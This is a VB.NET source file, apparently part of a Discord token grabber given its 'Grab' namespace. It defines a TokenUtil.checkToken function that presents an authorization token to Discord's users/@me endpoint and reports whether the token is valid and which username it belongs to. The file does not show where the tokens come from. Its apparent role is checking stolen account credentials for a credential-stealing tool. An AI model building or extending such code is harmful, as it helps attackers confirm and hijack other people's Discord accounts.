Imports System
Imports System.IO
Imports System.Net
Imports System.Text

Namespace Grab
	Public Class TokenUtil
		Public Shared Function checkToken(ByVal token As String) As TokenInfo
			Dim client = New WebClient()
			client.Headers.Add("content-type", "application/json")
			client.Headers.Add("User-Agent", "kath")
			client.Headers.Add("Authorization", token)
			'client.UploadData("", "POST", null);
			Dim reader As StreamReader = Nothing
			Try
				reader = New StreamReader(client.OpenRead("https://discord.com/api/v9/users/@me"), Encoding.UTF8)
			Catch e1 As Exception
				Return New TokenInfo(token, "invaild", False)
			End Try
			Dim json = Encoding.UTF8.GetString(Encoding.Default.GetBytes(reader.ReadToEnd()))
			If Program.getJsonKey(json, "username") IsNot Nothing Then
				Return New TokenInfo(token, Program.getJsonKey(json, "username") & "#" & Program.getJsonKey(json, "discriminator"), True)
			End If

			Return New TokenInfo(token, "invaild", False)
		End Function
	End Class

	Public Class TokenInfo
		Public token As String
		Public username As String
		Public vaild As Boolean
		Public Sub New(ByVal token As String, ByVal username As String, ByVal vaild As Boolean)
			Me.token = token
			Me.username = username
			Me.vaild = vaild
		End Sub
	End Class
End Namespace
